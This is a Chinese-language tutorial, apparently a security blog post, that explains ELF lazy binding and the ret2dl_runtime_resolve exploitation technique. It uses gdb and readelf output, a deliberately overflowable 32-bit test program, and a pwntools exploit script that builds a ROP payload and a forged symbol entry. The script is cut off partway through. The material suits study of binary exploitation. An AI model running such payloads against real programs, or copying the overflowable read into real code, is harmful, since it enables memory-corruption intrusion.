@@ -1,0 +1,296 @@
+<div class="detail_content markdown-body editormd-preview-container" id="markdown-body">
+<div id="app">
+<p>之前简单学了一波ret2dl_runtime_resolve的操作，但是没有认真记下笔记，只懂了大概的原理流程，到现在要回忆起具体的细节又想不起来orz，果然以我这老人家的记性不通过码字是记不牢的，因此这里再认真深入复现一次原理</p>
+<h1 data-content="1" id="1a31081ee2b7b396381bac5cb3ce309c">原理</h1>
+<p>拿一个自己写的c来测试一波：</p>
+<div class="highlight"><pre><span></span><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp"></span>
+<span class="kt">void</span> <span class="nf">say</span><span class="p">()</span>
+<span class="p">{</span>
+    <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">20</span><span class="p">];</span>
+    <span class="n">puts</span><span class="p">(</span><span class="s">"input your name:"</span><span class="p">);</span>
+    <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="o">&amp;</span><span class="n">buf</span><span class="p">,</span><span class="mi">120</span><span class="p">);</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"hello,%s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="n">buf</span><span class="p">);</span>
+    <span class="c1">//return 0;</span>
+<span class="p">}</span>
+
+<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
+<span class="p">{</span>
+    <span class="n">puts</span><span class="p">(</span><span class="s">"hello word!"</span><span class="p">);</span>
+    <span class="n">say</span><span class="p">();</span>
+    <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+<span class="p">}</span>
+</pre></div>
+<p>我这里编译成64位的程序来测试</p>
+<p>可以看到，程序一开始会先运行puts函数，打印出hello Word</p>
+<p>上gdb进行动态调试</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190318212349-11288eaa-4981-1.png"/></p>
+<p>我们用si跟进call puts@plt里面去，会走到0x400500的puts plt表中去，我们可以看到plt中的内容则是几条指令</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190318212401-17c75534-4981-1.png"/></p>
+<p>jmp 到 0x601018的地方去，这里其实就是got表</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190318212414-1fcdc54c-4981-1.png"/></p>
+<p>而我们可以看到，got表里面存的却是puts的plt表的第二条指令：</p>
+<p><code>0x400506       &lt;puts@plt+6&gt;                    push   0</code></p>
+<p>因此又回到plt表继续执行push 0操作</p>
+<p><code>0x40050b       &lt;puts@plt+11&gt;                   jmp    0x4004f0</code></p>
+<p>接着又push了0x601008的内容到栈顶</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190318212433-2b510d98-4981-1.png"/></p>
+<p>而0x601008正是GOT[1]，也就是push GOT[1]了，接着就jmp到GOT[2]，而GOT[2]的内容正是_dl_runtime_resolve函数的真实地址</p>
+<pre><code>GOT表的内容
+GOT[0]--&gt; 0x601000:0x0000000000600e28 -&gt;.dynamic的地址
+GOT[1]--&gt; 0x601008:0x00007ffff7ffe168 -&gt;link_map 此处包含链接器的标识信息
+GOT[2]--&gt; 0x601010:0x00007ffff7dee870 -&gt;_dl_runtime_resolve 动态链接器中的入口点
+GOT[3]--&gt; 0x601018:0x0000000000400506 -&gt; &lt;puts@plt+6&gt;
+。。。。</code></pre>
+<p>实际上，就是执行了<code>_dl_runtime_resolve(link_map, reloc_arg)</code>，通过这个神奇的函数，就能够把函数的真实地址写到got表，以后plt一执行之前的jmp的时候，就可以直接拿到真实的地址了，到这里，其实就可以解释动态链接中是如何调用函数的了，通过这个也可以对动态延迟绑定技术有进一步的理解。</p>
+<p>这里有一张图非常清晰的显示了函数第一次调用和第二次调用的流程：</p>
+<p><img src="https://ctf-wiki.github.io/ctf-wiki/executable/elf/figure/lazy-plt.png"/></p>
+<p>继续，我们来看一下这个link_map里面有个什么</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190318212452-369b2b34-4981-1.png"/></p>
+<p>可以看到link_map中有个.dynamic的地址 ，到这里就要介绍一波这些花里胡哨的段了</p>
+<p>.dynamic，动态节一般保存了 ELF 文件的如下信息</p>
+<ul>
+<li>依赖于哪些动态库</li>
+<li>动态符号节信息</li>
+<li>动态字符串节信息</li>
+</ul>
+<p>动态节的结构是这样的</p>
+<div class="highlight"><pre><span></span><span class="k">typedef</span> <span class="k">struct</span> <span class="p">{</span>
+    <span class="n">Elf32_Sword</span>     <span class="n">d_tag</span><span class="p">;</span>
+    <span class="k">union</span> <span class="p">{</span>
+        <span class="n">Elf32_Word</span>  <span class="n">d_val</span><span class="p">;</span>
+        <span class="n">Elf32_Addr</span>  <span class="n">d_ptr</span><span class="p">;</span>
+    <span class="p">}</span> <span class="n">d_un</span><span class="p">;</span>
+<span class="p">}</span> <span class="n">Elf32_Dyn</span><span class="p">;</span>
+<span class="k">extern</span> <span class="n">Elf32_Dyn_DYNAMIC</span><span class="p">[];</span>
+</pre></div>
+<p>用readelf -d ./main可以打印出程序的动态节的内容</p>
+<div class="highlight"><pre><span></span><span class="n">Dynamic</span> <span class="n">section</span> <span class="n">at</span> <span class="n">offset</span> <span class="mh">0xe28</span> <span class="n">contains</span> <span class="mi">24</span> <span class="nl">entries</span><span class="p">:</span>
+  <span class="err">标记</span>              <span class="err">类型</span>                 <span class="err">名称</span><span class="o">/</span><span class="err">值</span>
+ <span class="mh">0x0000000000000001</span> <span class="p">(</span><span class="n">NEEDED</span><span class="p">)</span>             <span class="err">共享库：</span><span class="p">[</span><span class="n">libc</span><span class="p">.</span><span class="n">so</span><span class="mf">.6</span><span class="p">]</span>
+ <span class="mh">0x000000000000000c</span> <span class="p">(</span><span class="n">INIT</span><span class="p">)</span>               <span class="mh">0x4004d0</span>
+ <span class="mh">0x000000000000000d</span> <span class="p">(</span><span class="n">FINI</span><span class="p">)</span>               <span class="mh">0x400774</span>
+ <span class="mh">0x0000000000000019</span> <span class="p">(</span><span class="n">INIT_ARRAY</span><span class="p">)</span>         <span class="mh">0x600e10</span>
+ <span class="mh">0x000000000000001b</span> <span class="p">(</span><span class="n">INIT_ARRAYSZ</span><span class="p">)</span>       <span class="mi">8</span> <span class="p">(</span><span class="n">bytes</span><span class="p">)</span>
+ <span class="mh">0x000000000000001a</span> <span class="p">(</span><span class="n">FINI_ARRAY</span><span class="p">)</span>         <span class="mh">0x600e18</span>
+ <span class="mh">0x000000000000001c</span> <span class="p">(</span><span class="n">FINI_ARRAYSZ</span><span class="p">)</span>       <span class="mi">8</span> <span class="p">(</span><span class="n">bytes</span><span class="p">)</span>
+ <span class="mh">0x000000006ffffef5</span> <span class="p">(</span><span class="n">GNU_HASH</span><span class="p">)</span>           <span class="mh">0x400298</span>
+ <span class="mh">0x0000000000000005</span> <span class="p">(</span><span class="n">STRTAB</span><span class="p">)</span>             <span class="mh">0x400378</span>  
+ <span class="mh">0x0000000000000006</span> <span class="p">(</span><span class="n">SYMTAB</span><span class="p">)</span>             <span class="mh">0x4002b8</span>
+ <span class="mh">0x000000000000000a</span> <span class="p">(</span><span class="n">STRSZ</span><span class="p">)</span>              <span class="mi">105</span> <span class="p">(</span><span class="n">bytes</span><span class="p">)</span>
+ <span class="mh">0x000000000000000b</span> <span class="p">(</span><span class="n">SYMENT</span><span class="p">)</span>             <span class="mi">24</span> <span class="p">(</span><span class="n">bytes</span><span class="p">)</span>
+ <span class="mh">0x0000000000000015</span> <span class="p">(</span><span class="n">DEBUG</span><span class="p">)</span>              <span class="mh">0x0</span>
+ <span class="mh">0x0000000000000003</span> <span class="p">(</span><span class="n">PLTGOT</span><span class="p">)</span>             <span class="mh">0x601000</span>
+ <span class="mh">0x0000000000000002</span> <span class="p">(</span><span class="n">PLTRELSZ</span><span class="p">)</span>           <span class="mi">144</span> <span class="p">(</span><span class="n">bytes</span><span class="p">)</span>
+ <span class="mh">0x0000000000000014</span> <span class="p">(</span><span class="n">PLTREL</span><span class="p">)</span>             <span class="n">RELA</span>
+ <span class="mh">0x0000000000000017</span> <span class="p">(</span><span class="n">JMPREL</span><span class="p">)</span>             <span class="mh">0x400440</span>
+ <span class="mh">0x0000000000000007</span> <span class="p">(</span><span class="n">RELA</span><span class="p">)</span>               <span class="mh">0x400428</span>
+ <span class="mh">0x0000000000000008</span> <span class="p">(</span><span class="n">RELASZ</span><span class="p">)</span>             <span class="mi">24</span> <span class="p">(</span><span class="n">bytes</span><span class="p">)</span>
+ <span class="mh">0x0000000000000009</span> <span class="p">(</span><span class="n">RELAENT</span><span class="p">)</span>            <span class="mi">24</span> <span class="p">(</span><span class="n">bytes</span><span class="p">)</span>
+ <span class="mh">0x000000006ffffffe</span> <span class="p">(</span><span class="n">VERNEED</span><span class="p">)</span>            <span class="mh">0x4003f8</span>
+ <span class="mh">0x000000006fffffff</span> <span class="p">(</span><span class="n">VERNEEDNUM</span><span class="p">)</span>         <span class="mi">1</span>
+ <span class="mh">0x000000006ffffff0</span> <span class="p">(</span><span class="n">VERSYM</span><span class="p">)</span>             <span class="mh">0x4003e2</span>
+ <span class="mh">0x0000000000000000</span> <span class="p">(</span><span class="nb">NULL</span><span class="p">)</span>               <span class="mh">0x0</span>
+</pre></div>
+<p>我们这里需要关注的是这些：</p>
+<div class="highlight"><pre><span></span><span class="mh">0x0000000000000005</span> <span class="p">(</span><span class="n">STRTAB</span><span class="p">)</span>             <span class="mh">0x400378</span>  
+ <span class="mh">0x0000000000000006</span> <span class="p">(</span><span class="n">SYMTAB</span><span class="p">)</span>             <span class="mh">0x4002b8</span>
+ <span class="mh">0x0000000000000017</span> <span class="p">(</span><span class="n">JMPREL</span><span class="p">)</span>             <span class="mh">0x400440</span>
+</pre></div>
+<p>STRTAB, SYMTAB, JMPREL分别指向.dynstr, .dynsym, .rel.plt节段</p>
+<p>这里解释一下，动态符号表 (.dynsym) 用来保存与动态链接相关的导入导出符号，不包括模块内部的符号。而 .symtab 则保存所有符号，包括 .dynsym 中的符号，因此一般来说，.symtab的内容多一点</p>
+<p>需要注意的是 <code>.dynsym</code> 是运行时所需的，ELF 文件中 export/import 的符号信息全在这里。但是<code>.symtab</code> 节中存储的信息是编译时的符号信息，用 <code>strip</code> 工具会被删除掉。</p>
+<p><code>.dynstr</code>节包含了动态链接的字符串。这个节以<code>\x00</code>作为开始和结尾，中间每个字符串也以<code>\x00</code>间隔。</p>
+<p>我们主要关注动态符号.dynsym中的两个成员</p>
+<ul>
+<li>st_name， 该成员保存着动态符号在 .dynstr 表（动态字符串表）中的偏移。</li>
+<li>st_value，如果这个符号被导出，这个符号保存着对应的虚拟地址。</li>
+</ul>
+<p>.rel.plt 包含了需要重定位的函数的信息，使用如下的结构，需要区分的是<code>.rel.plt</code>节是用于函数重定位，<code>.rel.dyn</code>节是用于变量重定位</p>
+<div class="highlight"><pre><span></span><span class="k">typedef</span> <span class="k">struct</span> <span class="p">{</span>
+    <span class="n">Elf32_Addr</span>        <span class="n">r_offset</span><span class="p">;</span>
+    <span class="n">Elf32_Word</span>       <span class="n">r_info</span><span class="p">;</span>
+<span class="p">}</span> <span class="n">Elf32_Rel</span><span class="p">;</span>
+<span class="c1">//32 位程序只使用 Elf32_Rel</span>
+<span class="c1">//64 位程序只使用 Elf32_Rela</span>
+<span class="k">typedef</span> <span class="k">struct</span> <span class="p">{</span>
+    <span class="n">Elf32_Addr</span>     <span class="n">r_offset</span><span class="p">;</span>
+    <span class="n">Elf32_Word</span>    <span class="n">r_info</span><span class="p">;</span>
+    <span class="n">Elf32_Sword</span>    <span class="n">r_addend</span><span class="p">;</span>
+<span class="p">}</span> <span class="n">Elf32_Rela</span><span class="p">;</span>
+</pre></div>
+<p>r_offset：指向对应got表的指针<br/>
+r_info：r_info&gt;&gt;8后得到一个下标，对应此导入符号在.dynsym中的下标</p>
+<p>介绍完以上，我们再回到这里：</p>
+<p>_dl_runtime_resolve(link_map, reloc_arg)</p>
+<p>这里的link_map就是GOT[1]</p>
+<p>这里的reloc_arg就是函数在.rel.plt中的偏移，就是之前push 0</p>
+<p>也就是说puts函数在.rel.plt中的偏移是0，我们用readelf -r main 发现的确如此</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190318212522-4870f186-4981-1.png"/></p>
+<p>接着就需要分析_dl_runtime_resolve(link_map, reloc_arg)到底干了什么，我们gdb跟进，发现在 _dl_runtime_resolve中又调用了 _dl_fixup函数</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190318212533-4f2c9f16-4981-1.png"/></p>
+<p>这个函数就是绑定真实地址到got的核心操作所在了</p>
+<p>这里直接贴一个大佬对 _dl_fixup 函数的分析</p>
+<div class="highlight"><pre><span></span><span class="n">_dl_fixup</span><span class="p">(</span><span class="k">struct</span> <span class="n">link_map</span> <span class="o">*</span><span class="n">l</span><span class="p">,</span> <span class="n">ElfW</span><span class="p">(</span><span class="n">Word</span><span class="p">)</span> <span class="n">reloc_arg</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="c1">// 首先通过参数reloc_arg计算重定位入口，这里的JMPREL即.rel.plt，reloc_offset即reloc_arg</span>
+    <span class="k">const</span> <span class="n">PLTREL</span> <span class="o">*</span><span class="k">const</span> <span class="n">reloc</span> <span class="o">=</span> <span class="p">(</span><span class="k">const</span> <span class="kt">void</span> <span class="o">*</span><span class="p">)</span> <span class="p">(</span><span class="n">D_PTR</span> <span class="p">(</span><span class="n">l</span><span class="p">,</span> <span class="n">l_info</span><span class="p">[</span><span class="n">DT_JMPREL</span><span class="p">])</span> <span class="o">+</span> <span class="n">reloc_offset</span><span class="p">);</span>
+    <span class="c1">// 然后通过reloc-&gt;r_info找到.dynsym中对应的条目</span>
+    <span class="k">const</span> <span class="nf">ElfW</span><span class="p">(</span><span class="n">Sym</span><span class="p">)</span> <span class="o">*</span><span class="n">sym</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">symtab</span><span class="p">[</span><span class="n">ELFW</span><span class="p">(</span><span class="n">R_SYM</span><span class="p">)</span> <span class="p">(</span><span class="n">reloc</span><span class="o">-&gt;</span><span class="n">r_info</span><span class="p">)];</span>
+    <span class="c1">// 这里还会检查reloc-&gt;r_info的最低位是不是R_386_JUMP_SLOT=7</span>
+    <span class="n">assert</span> <span class="p">(</span><span class="n">ELFW</span><span class="p">(</span><span class="n">R_TYPE</span><span class="p">)(</span><span class="n">reloc</span><span class="o">-&gt;</span><span class="n">r_info</span><span class="p">)</span> <span class="o">==</span> <span class="n">ELF_MACHINE_JMP_SLOT</span><span class="p">);</span>
+    <span class="c1">// 接着通过strtab+sym-&gt;st_name找到符号表字符串，result为libc基地址</span>
+    <span class="n">result</span> <span class="o">=</span> <span class="n">_dl_lookup_symbol_x</span> <span class="p">(</span><span class="n">strtab</span> <span class="o">+</span> <span class="n">sym</span><span class="o">-&gt;</span><span class="n">st_name</span><span class="p">,</span> <span class="n">l</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">sym</span><span class="p">,</span> <span class="n">l</span><span class="o">-&gt;</span><span class="n">l_scope</span><span class="p">,</span> <span class="n">version</span><span class="p">,</span> <span class="n">ELF_RTYPE_CLASS_PLT</span><span class="p">,</span> <span class="n">flags</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+    <span class="c1">// value为libc基址加上要解析函数的偏移地址，也即实际地址</span>
+    <span class="n">value</span> <span class="o">=</span> <span class="n">DL_FIXUP_MAKE_VALUE</span> <span class="p">(</span><span class="n">result</span><span class="p">,</span> <span class="n">sym</span> <span class="o">?</span> <span class="p">(</span><span class="n">LOOKUP_VALUE_ADDRESS</span> <span class="p">(</span><span class="n">result</span><span class="p">)</span> <span class="o">+</span> <span class="n">sym</span><span class="o">-&gt;</span><span class="n">st_value</span><span class="p">)</span> <span class="o">:</span> <span class="mi">0</span><span class="p">);</span>
+    <span class="c1">// 最后把value写入相应的GOT表条目中</span>
+    <span class="k">return</span> <span class="nf">elf_machine_fixup_plt</span> <span class="p">(</span><span class="n">l</span><span class="p">,</span> <span class="n">result</span><span class="p">,</span> <span class="n">reloc</span><span class="p">,</span> <span class="n">rel_addr</span><span class="p">,</span> <span class="n">value</span><span class="p">);</span>
+<span class="p">}</span>
+</pre></div>
+<p>综上所述，过程是这样的</p>
+<p>1、第一次执行函数，去plt表，接着去got表，由于没有真实地址，又返回plt表的第一项，压入reloc_arg和link_map后调用_dl_runtime_resolve(link_map, reloc_arg)</p>
+<p>2、link_map访问.dynamic节段，并获得.dynstr, .dynsym, .rel.plt节段的地址</p>
+<p>3、.rel.plt + reloc_arglt=0，求出对应函数重定位表项Elf32_Rel的指针，这里puts的是：</p>
+<div class="highlight"><pre><span></span><span class="err">重定位节</span> <span class="err">'</span><span class="p">.</span><span class="n">rela</span><span class="p">.</span><span class="n">plt</span><span class="err">'</span> <span class="err">位于偏移量</span> <span class="mh">0x440</span> <span class="err">含有</span> <span class="mi">6</span> <span class="err">个条目：</span>
+  <span class="err">偏移量</span>          <span class="err">信息</span>           <span class="err">类型</span>           <span class="err">符号值</span>         <span class="err">符号名称</span> <span class="o">+</span> <span class="err">加数</span>
+<span class="mo">00000060101</span><span class="mi">8</span>  <span class="mo">000100000007</span> <span class="n">R_X86_64_JUMP_SLO</span> <span class="mo">0000000000000000</span> <span class="n">puts</span><span class="err">@</span><span class="n">GLIBC_2</span><span class="mf">.2.5</span> <span class="o">+</span> <span class="mi">0</span>
+<span class="mo">000000601020</span>  <span class="mo">000200000007</span> <span class="n">R_X86_64_JUMP_SLO</span> <span class="mo">0000000000000000</span> <span class="n">__stack_chk_fail</span><span class="err">@</span><span class="n">GLIBC_2</span><span class="mf">.4</span> <span class="o">+</span> <span class="mi">0</span>
+<span class="mo">00000060102</span><span class="mi">8</span>  <span class="mo">000300000007</span> <span class="n">R_X86_64_JUMP_SLO</span> <span class="mo">0000000000000000</span> <span class="n">printf</span><span class="err">@</span><span class="n">GLIBC_2</span><span class="mf">.2.5</span> <span class="o">+</span> <span class="mi">0</span>
+<span class="mo">000000601030</span>  <span class="mo">000400000007</span> <span class="n">R_X86_64_JUMP_SLO</span> <span class="mo">0000000000000000</span> <span class="n">read</span><span class="err">@</span><span class="n">GLIBC_2</span><span class="mf">.2.5</span> <span class="o">+</span> <span class="mi">0</span>
+<span class="mo">00000060103</span><span class="mi">8</span>  <span class="mo">000500000007</span> <span class="n">R_X86_64_JUMP_SLO</span> <span class="mo">0000000000000000</span> <span class="n">__libc_start_main</span><span class="err">@</span><span class="n">GLIBC_2</span><span class="mf">.2.5</span> <span class="o">+</span> <span class="mi">0</span>
+<span class="mo">000000601040</span>  <span class="mo">000700000007</span> <span class="n">R_X86_64_JUMP_SLO</span> <span class="mo">0000000000000000</span> <span class="n">exit</span><span class="err">@</span><span class="n">GLIBC_2</span><span class="mf">.2.5</span> <span class="o">+</span> <span class="mi">0</span>
+</pre></div>
+<p>4、通过重定位表项Elf32_Rel的指针，得到对应函数的r_info，r_info &gt;&gt; 8作为.dynsym的下标（这里puts是1），求出当前函数的符号表项Elf32_Sym的指针：</p>
+<div class="highlight"><pre><span></span><span class="n">Symbol</span> <span class="n">table</span> <span class="err">'</span><span class="p">.</span><span class="n">dynsym</span><span class="err">'</span> <span class="n">contains</span> <span class="mi">8</span> <span class="nl">entries</span><span class="p">:</span>
+   <span class="nl">Num</span><span class="p">:</span>    <span class="n">Value</span>          <span class="n">Size</span> <span class="n">Type</span>    <span class="n">Bind</span>   <span class="n">Vis</span>      <span class="n">Ndx</span> <span class="n">Name</span>
+     <span class="mi">0</span><span class="o">:</span> <span class="mo">0000000000000000</span>     <span class="mi">0</span> <span class="n">NOTYPE</span>  <span class="n">LOCAL</span>  <span class="n">DEFAULT</span>  <span class="n">UND</span> 
+     <span class="mi">1</span><span class="o">:</span> <span class="mo">0000000000000000</span>     <span class="mi">0</span> <span class="n">FUNC</span>    <span class="n">GLOBAL</span> <span class="n">DEFAULT</span>  <span class="n">UND</span> <span class="n">puts</span><span class="err">@</span><span class="n">GLIBC_2</span><span class="mf">.2.5</span> <span class="p">(</span><span class="mi">2</span><span class="p">)</span>
+     <span class="mi">2</span><span class="o">:</span> <span class="mo">0000000000000000</span>     <span class="mi">0</span> <span class="n">FUNC</span>    <span class="n">GLOBAL</span> <span class="n">DEFAULT</span>  <span class="n">UND</span> <span class="n">__stack_chk_fail</span><span class="err">@</span><span class="n">GLIBC_2</span><span class="mf">.4</span> <span class="p">(</span><span class="mi">3</span><span class="p">)</span>
+     <span class="mi">3</span><span class="o">:</span> <span class="mo">0000000000000000</span>     <span class="mi">0</span> <span class="n">FUNC</span>    <span class="n">GLOBAL</span> <span class="n">DEFAULT</span>  <span class="n">UND</span> <span class="n">printf</span><span class="err">@</span><span class="n">GLIBC_2</span><span class="mf">.2.5</span> <span class="p">(</span><span class="mi">2</span><span class="p">)</span>
+     <span class="mi">4</span><span class="o">:</span> <span class="mo">0000000000000000</span>     <span class="mi">0</span> <span class="n">FUNC</span>    <span class="n">GLOBAL</span> <span class="n">DEFAULT</span>  <span class="n">UND</span> <span class="n">read</span><span class="err">@</span><span class="n">GLIBC_2</span><span class="mf">.2.5</span> <span class="p">(</span><span class="mi">2</span><span class="p">)</span>
+     <span class="mi">5</span><span class="o">:</span> <span class="mo">0000000000000000</span>     <span class="mi">0</span> <span class="n">FUNC</span>    <span class="n">GLOBAL</span> <span class="n">DEFAULT</span>  <span class="n">UND</span> <span class="n">__libc_start_main</span><span class="err">@</span><span class="n">GLIBC_2</span><span class="mf">.2.5</span> <span class="p">(</span><span class="mi">2</span><span class="p">)</span>
+     <span class="mi">6</span><span class="o">:</span> <span class="mo">0000000000000000</span>     <span class="mi">0</span> <span class="n">NOTYPE</span>  <span class="n">WEAK</span>   <span class="n">DEFAULT</span>  <span class="n">UND</span> <span class="n">__gmon_start__</span>
+     <span class="mi">7</span><span class="o">:</span> <span class="mo">0000000000000000</span>     <span class="mi">0</span> <span class="n">FUNC</span>    <span class="n">GLOBAL</span> <span class="n">DEFAULT</span>  <span class="n">UND</span> <span class="n">exit</span><span class="err">@</span><span class="n">GLIBC_2</span><span class="mf">.2.5</span> <span class="p">(</span><span class="mi">2</span><span class="p">)</span>
+</pre></div>
+<p>5、利用Elf32_Sym的指针得到对应的st_name，.dynstr + st_name即为符号名字符串指针</p>
+<p>6、在动态链接库查找这个函数，并且把地址赋值给.rel.plt中对应条目的r_offset：指向对应got表的指针，由此puts的got表就被写上了真实的地址</p>
+<p>7、赋值给GOT表后，把程序流程返回给puts</p>
+<h1 data-content="1" id="d3d44d15d2db1c962077004987bb001a">利用操作</h1>
+<p>通过上面的分析，其实很关键的一点，就是要先从plt[0]开始这一切</p>
+<p>因此我们在利用的时候首先要做的是把程序流程给跳到plt[0]中</p>
+<p>然后根据上面的7步流程中，可以分析出有三种利用的方法</p>
+<ul>
+<li>
+<p>伪造ink_map使得dynamic指向我们可以控制的地方</p>
+</li>
+<li>
+<p>改写.dynamic的DT_STRTAB指向我们可以控制的地方</p>
+</li>
+<li>
+<p>伪造reloc_arg，也就是伪造一个很大的<code>.rel.plt</code>offset，使得加上去之后的地址指向我们可以控制的地方</p>
+</li>
+</ul>
+<p>这里一般都用最后一种，因为前两种要求完全没开RELRO保护，但一般都会开Partial RELRO，这样都直接导致.dynamic不可写</p>
+<p>这里用这个小程序来测试一下</p>
+<div class="highlight"><pre><span></span><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp"></span>
+<span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp"></span>
+<span class="kt">void</span> <span class="nf">vul</span><span class="p">()</span>
+<span class="p">{</span>
+    <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">28</span><span class="p">];</span>
+    <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="mi">128</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
+<span class="p">{</span>
+    <span class="kt">char</span> <span class="n">name</span><span class="p">[]</span><span class="o">=</span><span class="s">"input your name!</span><span class="se">\n</span><span class="s">"</span><span class="p">;</span>
+    <span class="n">write</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="n">name</span><span class="p">,</span><span class="n">strlen</span><span class="p">(</span><span class="n">name</span><span class="p">));</span>
+    <span class="n">vul</span><span class="p">();</span>
+<span class="p">}</span>
+
+<span class="c1">//gcc  -m32 -fno-stack-protector main.c -o main32</span>
+</pre></div>
+<p>用一张图来解释exp的利用流程，应该非常清楚了</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190318212600-5ebb9590-4981-1.png"/></p>
+<p>exp:如下</p>
+<div class="highlight"><pre><span></span><span class="c1">#coding=utf-8</span>
+<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span><span class="o">*</span>
+<span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">'debug'</span>
+<span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">'./main32'</span><span class="p">)</span>
+<span class="n">elf</span> <span class="o">=</span><span class="n">ELF</span><span class="p">(</span><span class="s2">"./main32"</span><span class="p">)</span>
+<span class="k">def</span> <span class="nf">debug</span><span class="p">(</span><span class="n">addr</span><span class="o">=</span><span class="s1">''</span><span class="p">):</span>
+    <span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">p</span><span class="p">,</span><span class="s1">''</span><span class="p">)</span>
+    <span class="n">pause</span><span class="p">()</span>
+<span class="n">bss</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">bss</span><span class="p">()</span>
+<span class="n">ppp_ret</span> <span class="o">=</span> <span class="mh">0x08048549</span> 
+<span class="n">pop_ebp_ret</span> <span class="o">=</span> <span class="mh">0x0804854b</span>
+<span class="n">leave_ret</span> <span class="o">=</span> <span class="mh">0x080483d8</span>
+<span class="n">PLT</span> <span class="o">=</span> <span class="mh">0x8048310</span>
+<span class="n">rel_plt</span> <span class="o">=</span> <span class="mh">0x80482CC</span>
+<span class="n">elf_dynsym</span> <span class="o">=</span> <span class="mh">0x080481CC</span>
+<span class="n">elf_dynstr</span> <span class="o">=</span> <span class="mh">0x0804823c</span>
+<span class="n">stack_addr</span> <span class="o">=</span> <span class="n">bss</span> <span class="o">+</span> <span class="mh">0x300</span>
+<span class="n">read_plt</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">plt</span><span class="p">[</span><span class="s1">'read'</span><span class="p">]</span>
+<span class="n">write_plt</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">plt</span><span class="p">[</span><span class="s1">'write'</span><span class="p">]</span>
+
+<span class="k">def</span> <span class="nf">exp</span><span class="p">():</span>
+    <span class="n">payload</span> <span class="o">=</span> <span class="s1">'a'</span> <span class="o">*</span> <span class="p">(</span><span class="mh">0x24</span><span class="o">+</span><span class="mi">4</span><span class="p">)</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">read_plt</span><span class="p">)</span><span class="c1">#read(0,stack_addr,100) </span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">ppp_ret</span><span class="p">)</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">stack_addr</span><span class="p">)</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mi">100</span><span class="p">)</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">pop_ebp_ret</span><span class="p">)</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">stack_addr</span><span class="p">)</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">leave_ret</span><span class="p">)</span><span class="c1">#esp指向stack_addr</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">"input your name!</span><span class="se">\n</span><span class="s2">"</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+
+    <span class="n">index_offset</span> <span class="o">=</span> <span class="p">(</span><span class="n">stack_addr</span> <span class="o">+</span> <span class="mi">28</span><span class="p">)</span> <span class="o">-</span> <span class="n">rel_plt</span>
+    <span class="n">write_got</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">'write'</span><span class="p">]</span>
+
+    <span class="c1">#伪造dynsym</span>
+    <span class="n">fake_dynsym</span> <span class="o">=</span> <span class="n">stack_addr</span> <span class="o">+</span> <span class="mi">36</span>
+    <span class="n">align</span> <span class="o">=</span> <span class="mh">0x10</span> <span class="o">-</span> <span class="p">((</span><span class="n">fake_dynsym</span> <span class="o">-</span> <span class="n">elf_dynsym</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xf</span><span class="p">)</span><span class="c1">#</span>
+    <span class="n">fake_dynsym</span> <span class="o">=</span> <span class="n">fake_dynsym</span> <span class="o">+</span> <span class="n">align</span>
+    <span class="c1">#这里的对齐操作是因为dynsym里的Elf32_Sym结构体都是0x10字节大小</span>
+
